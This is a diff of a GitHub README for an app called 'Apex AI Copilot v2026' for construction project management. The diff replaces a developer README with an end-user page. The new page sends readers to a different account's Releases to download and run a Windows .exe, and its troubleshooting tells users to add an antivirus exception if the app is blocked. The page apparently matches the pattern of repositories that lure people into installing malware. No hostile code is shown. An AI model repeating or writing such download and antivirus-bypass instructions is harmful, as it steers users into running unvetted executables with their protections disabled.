@@ -1,157 +1,74 @@
-# Apex AI Copilot v2026 - Construction Management Platform 2026
+# 🏗️ apex-copilot-project-hub - Manage construction projects with smart assistance
 
-> **Apex AI Copilot is a multimodal workspace for construction management, available through the web, Windows desktop, and mobile PWA. Version 2026 combines conversational assistance, project administration, BIM 3D, and digital-twin workflows.**
+[![Download Apex Copilot](https://img.shields.io/badge/Download-Apex_Copilot_v2026-blue.svg)](https://github.com/Strategic-westoncell535/apex-copilot-project-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%2C%20Windows%20desktop%2C%20mobile%20PWA-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/isaacjamescjf1869/apex-copilot-project-hub?style=flat-square)](https://github.com/isaacjamescjf1869/apex-copilot-project-hub)
+Apex AI Copilot v2026 acts as a central workspace for construction teams. It combines project planning, administration, and digital mapping in one place. You use this tool to manage your construction sites from your computer or mobile device.
 
----
+## 📥 How to Install on Windows
 
-<p align="center">
-  <a href="https://isaacjamescjf1869.github.io/apex-copilot-project-hub/">
-    <img src="https://img.shields.io/badge/Download-Apex%20AI%20Copilot%20Latest-brightgreen?style=for-the-badge" alt="Download Apex AI Copilot">
-  </a>
-</p>
+1. Visit the [official download page](https://github.com/Strategic-westoncell535/apex-copilot-project-hub).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the link for the latest Windows installer file, which ends in .exe.
+4. Save the file to your desktop.
+5. Double-click the file to start the installation.
+6. Follow the instructions on your screen.
+7. Open the application from your desktop shortcut once the install finishes.
 
-> **[Download Apex AI Copilot v2026](https://isaacjamescjf1869.github.io/apex-copilot-project-hub/)**
+## 💻 System Requirements
 
----
+Your computer must meet these standards to run the software smoothly:
 
-[Download Latest Build](https://isaacjamescjf1869.github.io/apex-copilot-project-hub/)
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or better.
+- Memory: 8 gigabytes of RAM or more.
+- Storage: 500 megabytes of free disk space.
+- Internet Connection: Active connection for cloud syncing.
 
----
+## 🛠️ Key Features
 
-## What Apex AI Copilot Provides
+### Conversational Assistance
+The built-in assistant answers questions about your project plans. You type your request in the chat box, and the system pulls data from your files. This feature saves time when you search for specific building codes or material lists.
 
-Apex AI Copilot gives construction teams one conversational environment for managing project administration and everyday operations. It brings together budget and contract work, field activity, project documentation, and multimodal interaction with project information.
+### Project Administration
+The workspace organizes your project documents in one view. You upload contracts, safety logs, and meeting minutes to the dashboard. The system sorts these files by date and category. You keep your team updated by sharing these files through the portal.
 
-Operational data and workflows can be connected with BIM 3D visualization and digital-twin experiences. The application runs in a browser, as a Windows desktop experience, or through an offline-capable mobile PWA, allowing teams to move between office, field, and mobile work.
+### BIM 3D Visualization
+You view building information models directly within the application. The viewer lets you rotate, zoom, and inspect 3D components of your construction site. It helps you catch errors before you start physical work.
 
----
+### Digital-Twin Workflows
+The software links your digital model to real-time data from the field. You track progress as workers report status updates. This creates a virtual replica of your site that updates as the project moves forward.
 
-## Core Capabilities
+## ⚙️ Initial Setup
 
-- Conversational assistance within a construction project workspace
-- Workflows for project administration and operations
-- Budget oversight and contract administration
-- Field activity tracking and RDO workflows
-- BIM 3D views and digital-twin processes
-- Local and offline GGUF model execution
-- Image and video generation
-- Neural voice and avatar functionality
-- Multitenant user authentication
-- Mobile PWA access with offline capability
-- Supabase and PostgreSQL connectivity
-- GitHub Actions automation, Vercel deployment, and end-to-end testing support
+When you open the app for the first time, you must link your account. 
 
----
+1. Launch the application.
+2. Select the "Create Account" option.
+3. Enter your email and set a secure password.
+4. Verify your email address through the link sent to your inbox.
+5. Sign in to the app.
 
-## Getting Started
+The software will ask you to set your default project folder. Choose a folder on your computer or a synced cloud drive. This folder holds your project files and ensures the software can find your work.
 
-First, clone the repository and enter the project directory:
+## 🔧 Frequently Asked Questions
 
-```bash
-git clone https://github.com/isaacjamescjf1869/apex-copilot-project-hub.git
-cd apex-copilot-project-ops
-```
+### Does the software work offline?
+The app needs an internet connection to sync project data. You can view cached files if you lose your connection, but you cannot update project status or download new BIM files until the connection returns.
 
-Next, configure the application for the environment where it will run. Start the project with the development or deployment workflow provided by the repository. Hosted deployments can use Supabase or PostgreSQL for application data, with deployment handled through the supported Vercel or GitHub Actions process.
+### Can I share my project with others?
+Yes. Click the "Share" button at the top of your project dashboard. Enter the email addresses of your team members. They will receive an invitation to join your workspace. You control the permissions for each member, such as read-only access or edit access.
 
-For the Windows target, launch the desktop build once it has been installed or deployed. For mobile access, open the deployed application in a compatible browser and install it as a PWA when the device supports that option.
+### How do I update the application?
+The application checks for updates every time you open it. If a new version exists, a notification appears. Click "Update Now" to download the newest version. The app restarts automatically once the update finishes.
 
----
+### Is my data secure?
+All data moving between your computer and our servers uses encryption. We store your project files in secure cloud storage. Your account requires a password, and we recommend that you use a strong combination of characters.
 
-## Typical Workflow
+## 🆘 Troubleshooting
 
-A project session may follow this sequence:
+- App does not launch: Check if your antivirus software is blocking the file. Add an exception for the Apex Copilot application in your security settings.
+- Files do not sync: Check your internet connection. Ensure you have enough disk space on your local computer.
+- Model looks blurry: Go to Settings and select "Graphics." Increase the quality setting to High. Note that this requires a better graphics card.
+- Cannot see project files: Ensure you chose the correct folder during the initial setup. Go to Settings, then "File Paths" to change your active folder.
 
-1. Authenticate through the multitenant access system.
-2. Choose an existing construction project or open its workspace.
-3. Use the conversational copilot for project administration and operational questions.
-4. Inspect budgets, contracts, field activity, and RDO information.
-5. Switch to BIM 3D or digital-twin views when additional project context is needed.
-6. Carry out field work through the mobile PWA, including supported offline activity.
-7. Restore connectivity and synchronize changes after returning online.
-8. Run GGUF models locally when offline model processing has been configured.
-
----
-
-## Environment and Configuration
-
-The application relies on project services centered on Supabase and PostgreSQL. Runtime environment configuration is used to define database, authentication, deployment, and model options for the selected target.
-
-Relevant settings may include:
-
-```text
-Database provider: Supabase or PostgreSQL
-Authentication: Multitenant project access
-Model execution: Local or offline GGUF models
-Deployment: Vercel and/or GitHub Actions
-Client targets: Web, Windows desktop, mobile PWA
-```
-
-Do not commit service credentials or model assets to the repository. Use the deployment configuration supplied by the project to find the required variable names and startup procedure.
-
----
-
-## System Requirements
-
-- A web browser for browser-based usage
-- A Windows environment for the desktop client
-- A mobile browser that supports PWA installation for mobile use
-- Supabase or PostgreSQL for project data services
-- Network connectivity for hosted use and synchronization
-- Sufficient local storage and model resources for GGUF execution
-- A deployment environment that works with the project's Vercel or GitHub Actions workflow
-
----
-
-## Frequently Asked Questions
-
-### Which teams can use Apex AI Copilot?
-
-The platform targets construction teams handling project administration, field operations, budgets, contracts, project records, and related digital project information.
-
-### Is there a mobile version?
-
-Yes. Supported mobile browsers can use the offline-capable mobile PWA experience.
-
-### Are GGUF models available without a network connection?
-
-Yes, local and offline GGUF execution is supported when the necessary model files, resources, and configuration are available.
-
-### Where do database and application settings live?
-
-These values are supplied through the application's environment and deployment configuration. Supabase or PostgreSQL provide the database and authentication service foundation.
-
-### How can the application be updated?
-
-The project can deliver updates through its GitHub Actions and Vercel workflows, or users can obtain the latest available build.
-
-### What steps help diagnose a startup failure?
-
-Check the deployment configuration first, then confirm that database and authentication services are reachable and that all required environment values are set. Review project logs for additional details. If the issue concerns model execution, verify that the selected GGUF resources exist and are configured for the intended environment.
-
-### Can users work with one project across different devices?
-
-Yes. With multitenant authentication configured and the appropriate account permissions, the same platform can be accessed through the web, Windows desktop, and mobile PWA targets.
-
----
-
-## Planned Development
-
-- Add broader conversational assistance for construction operations
-- Further develop BIM 3D and digital-twin workflows
-- Improve field workflows and offline PWA support
-- Continue refining local GGUF model execution
-- Expand multimodal image, video, voice, and avatar capabilities
-- Preserve automated deployment and end-to-end test coverage
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: construction management, project workspace, BIM, digital twin, building software, Windows app, task management
